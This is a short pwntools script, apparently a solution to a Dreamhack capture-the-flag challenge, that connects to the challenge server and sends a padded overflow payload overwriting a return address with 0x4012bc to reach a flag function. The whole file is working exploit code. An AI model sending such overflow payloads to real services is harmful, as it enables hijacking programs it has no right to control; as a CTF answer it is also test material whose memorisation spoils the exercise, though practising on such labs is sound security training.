from pwn import *

# p = process('./chall')
p = remote('host3.dreamhack.games', 11818)
flag = 0x4012bc

payload1 = b'cherry' + b'a' * 10
payload2 = b'a' * 26 + p64(flag)

p.recvuntil(b'Menu: ')
p.send(payload1)
p.recvuntil(b'Is it cherry?: ')
p.send(payload2)

p.interactive()